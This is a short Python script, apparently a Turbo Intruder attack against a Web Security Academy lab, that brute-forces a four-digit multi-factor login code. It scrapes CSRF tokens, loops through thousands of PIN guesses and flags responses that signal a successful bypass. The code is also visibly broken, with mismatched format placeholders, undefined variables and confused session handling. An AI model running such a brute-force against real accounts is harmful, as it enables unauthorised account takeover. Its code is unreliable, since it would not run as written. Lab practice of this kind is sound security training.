from bs4 import BeautifulSoup

Host = "0ae600520485dabfc0541b7500a500c3"

def login_1():     
    login1 = """GET /login HTTP/1.1
Host: {host}.web-security-academy.net
Cookie: session=DUOR5FCcH5fqbykUnm7w3BuEuaOZPyOE
Connection: close""".format(Host)
    engine.queue(target.req, login1)
    soup = BeautifulSoup(req.response)
    csrf = soup.find(name="csrf")
    #csrf = soup.find("input", value=True)["value"] 
    return csrf

def login_2(csrf_value):    
    login2 = """GET /login HTTP/1.1
Host: {host}.web-security-academy.net
Cookie: session={csrf_value}
Connection: close""".format(Host, csrf_value)
    engine.queue(target.req, login2)
    soup = BeautifulSoup(req.response)
    csrf = soup.find(name="csrf")
    return csrf

def login_3(session):    
    login3 = """GET /login2 HTTP/1.1
Host: {host}.web-security-academy.net
Cookie: session={session}
Connection: close""".format(Host, session)
    engine.queue(target.req, login3)
    soup = BeautifulSoup(req.response)
    csrf2 = soup.find(name="csrf")
    return csrf2

def login_4(csrf2):    
    login4 = """POST /login2 HTTP/1.1
Host: {host}.web-security-academy.net
Cookie: session={session}
Connection: close""".format(Host, csrf2)
    engine.queue(target.req, login4)
    soup = BeautifulSoup(req.response)
    return csrf2
    
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           engine=Engine.BURP, 
                           pipeline=False
                           ) 
    pin=0
    for i in range(5000):
        csrf1 = login_1()
        session = login_2(csrf1)
        csrf_mfa = login_3(session)
                
        guess = str(pin).zfill(4)
        engine.queue(target.req, [session, csrf_mfa, guess])
        pin += 1
        guess = str(pin).zfill(4)
        engine.queue(target.req, [session, csrf_mfa, guess])


def handleResponse(req, interesting):
    if 'Incorrect security code' not in req.response or req.status == 302:
            table.add(req)


# engine.queue(target.req, "", label='x')


